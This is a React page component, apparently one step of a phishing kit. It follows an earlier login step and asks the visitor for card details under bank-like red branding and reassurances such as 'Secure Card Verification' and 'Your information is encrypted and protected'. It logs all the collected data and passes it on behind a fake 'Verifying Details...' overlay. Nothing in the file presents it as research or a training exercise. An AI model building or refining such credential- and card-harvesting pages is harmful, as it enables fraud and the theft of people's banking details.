import React, { useState } from 'react';
import { HelpCircle } from 'lucide-react';
import Header from '../components/Header';
import CardVerificationForm from '../components/CardVerificationForm';
import SecurityCentre from '../components/SecurityCentre';
import UsefulInfo from '../components/UsefulInfo';
import PromoBanners from '../components/PromoBanners';
import Footer from '../components/Footer';

export default function CardVerificationPage({ loginData, onCardVerificationSubmit }) {
  const [isProcessing, setIsProcessing] = useState(false);

  const handleCardVerificationSubmit = (step3Data) => {
    console.log('Card verification completed - ALL DATA:', step3Data);
    setIsProcessing(true);
    
    if (onCardVerificationSubmit) {
      onCardVerificationSubmit(step3Data);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50">
      <Header />

      {/* Processing Overlay */}
      {isProcessing && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white rounded-lg p-8 max-w-md mx-4 text-center">
            <div className="animate-spin rounded-full h-16 w-16 border-b-2 border-red-600 mx-auto mb-4"></div>
            <h3 className="text-xl font-semibold mb-2">Verifying Details...</h3>
            <p className="text-gray-600">Please wait while we verify your information</p>
          </div>
        </div>
      )}

      <div className="max-w-7xl mx-auto px-4 py-6 lg:py-8">
        <div className="grid lg:grid-cols-[400px,1fr] gap-6">
          <CardVerificationForm 
            onSubmit={handleCardVerificationSubmit} 
            loginData={loginData} 
          />

          {/* Right Side Content - Hidden on Mobile */}
          <div className="hidden lg:block space-y-6">
            {/* Banner */}
            <div className="bg-gradient-to-r from-red-700 to-red-600 text-white p-6 rounded-lg flex items-center justify-between">
              <div>
                <h3 className="text-2xl font-bold mb-2">
                  Secure Card Verification
                </h3>
                <p>Your information is encrypted and protected.</p>
              </div>
              <div className="w-20 h-20 bg-white bg-opacity-20 rounded-lg flex items-center justify-center">
                <div className="text-4xl">🔒</div>
              </div>
            </div>

            {/* Two Column Layout */}
            <div className="grid grid-cols-2 gap-6">
              <SecurityCentre />
              <UsefulInfo />
            </div>

            <PromoBanners />
          </div>
        </div>

        {/* Mobile Banner */}
        <div className="lg:hidden mt-6 bg-gradient-to-r from-red-700 to-red-600 text-white p-6 rounded-lg">
          <h3 className="text-xl font-bold mb-2">
            Secure Card Verification
          </h3>
          <p className="text-sm">Your information is encrypted and protected.</p>
        </div>
      </div>

      <Footer />

      {/* Floating Help Button - Mobile Only */}
      <button className="lg:hidden fixed bottom-6 right-6 bg-red-600 text-white w-14 h-14 rounded-full shadow-lg flex items-center justify-center hover:bg-red-700 transition-colors z-50">
        <HelpCircle size={24} />
      </button>
    </div>
  );
}